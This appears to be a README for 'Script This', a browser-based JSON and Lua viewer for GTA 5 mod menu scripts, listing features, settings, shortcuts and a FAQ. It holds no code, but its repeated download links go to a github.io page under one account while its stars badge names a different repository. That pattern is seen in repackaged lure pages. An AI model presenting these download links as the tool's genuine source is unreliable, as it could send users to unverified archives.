# Script This v1.0 - JSON & Lua Development Tool 2026

> **A browser-based utility for viewing, editing, and organizing Lua script data used with GTA 5 mod menus.** Built for Cherax, Modest Menu, and other similar customization platforms.

[![Development Tool](https://img.shields.io/badge/Type-Development%20Tool-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/daniel-king1991/script-this-lua-editor?style=flat-square)](https://github.com/Ronnie-Reagan/ScriptThis)

---

<p align="center">
  <a href="https://daniel-king1991.github.io/script-this-lua-editor/">
    <img src="https://img.shields.io/badge/Download-Script%20This-brightgreen?style=for-the-badge" alt="Download Script This">
  </a>
</p>

> **[Direct Download - Script This](https://daniel-king1991.github.io/script-this-lua-editor/)**

---

[Download Latest Build](https://daniel-king1991.github.io/script-this-lua-editor/)

---

## What It Does

Script This is an interactive environment for developers who work with Lua scripts and JSON configuration data for GTA 5 mod menus. It pairs a code-focused viewer with a tree-based inspector so you can explore script structure, locate entries faster, and keep several documents open at once. The interface is meant to give quick access to script content without needing a full IDE.

This release puts emphasis on smoother document browsing and more flexible export handling. You can move between different menu setups, inspect JSON trees with adjustable styling, and copy or download selected content as needed. A music player and a built-in help layer complete the workflow, turning the app into a compact reference space for editing sessions.

---

## Core Capabilities

- **Split code and tree views** - Toggle between raw source and structured data for the same file
- **Live search** - Narrow results across script entries with matches highlighted as you type
- **Multi-select and clipboard management** - Select several nodes or lines and copy them together
- **Tree style customization** - Control colors, indentation, and how nodes are displayed
- **Expand/Collapse all** - Open or fold large JSON trees in one action
- **Download JSON** - Save the active document or selected branches as a JSON file
- **Quick document switching** - Open and swap between multiple menu configurations without reloading the page
- **Music integration** - Built-in background audio for longer work sessions
- **Help and documentation overlay** - On-screen guidance for controls and available features

---

## Installation

Get the latest build from the link above. Unzip the archive into a folder called `ScriptThis`. Then open `index.html` in a modern web browser such as Chrome, Firefox, Edge, or a comparable browser. No server setup or installation step is required because everything runs client-side.

To open a script, use the import button or drag and drop a JSON or Lua file onto the app. Once loaded, the file appears in both the code view and the tree view automatically.

---

## Settings

| Setting | Description | Default |
|---------|-------------|---------|
| Tree indent | Number of pixels per indent level | 16px |
| Font size | Code view font size in pixels | 14px |
| Dark mode | Toggle between light and dark themes | On |
| Auto-expand | Expand all tree nodes on file load | Off |
| Clipboard format | Plain text or JSON format for copy actions | JSON |

Keyboard shortcuts:

| Key | Action |
|-----|--------|
| Ctrl+F | Open search bar |
| Ctrl+Shift+E | Expand all tree nodes |
| Ctrl+Shift+C | Collapse all tree nodes |
| Ctrl+S | Download current document as JSON |

---

## Compatibility

- **Browsers:** Chrome 80+, Firefox 80+, Edge 80+, Safari 14+
- **Target files:** JSON and Lua script files used with GTA 5 mod menus (Cherax, Modest Menu, etc.)
- **Limitations:** Large files (over 50 MB) may cause slower tree rendering. Lua syntax highlighting is basic - advanced IDE features are not included.

---

## FAQ

**How do I load a script file?**  
Drag a `.json` or `.lua` file onto the interface, or choose one with the file picker button in the top toolbar.

**Can I update the tool without losing my settings?**  
Yes. Preferences are saved in browser local storage and remain after updates. Just replace the old folder with the new build.

**Is customization possible beyond the provided options?**  
Yes - you can edit `config.js` to add new themes or adjust the default hotkeys. The help overlay includes more information.

**Does this work with mod menus other than Cherax and Modest Menu?**  
It works with any JSON or Lua script structure. Actual compatibility depends on the file format used by your menu.

**Where are exported files saved?**  
Downloads are saved to your browser's default download folder as `.json` files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
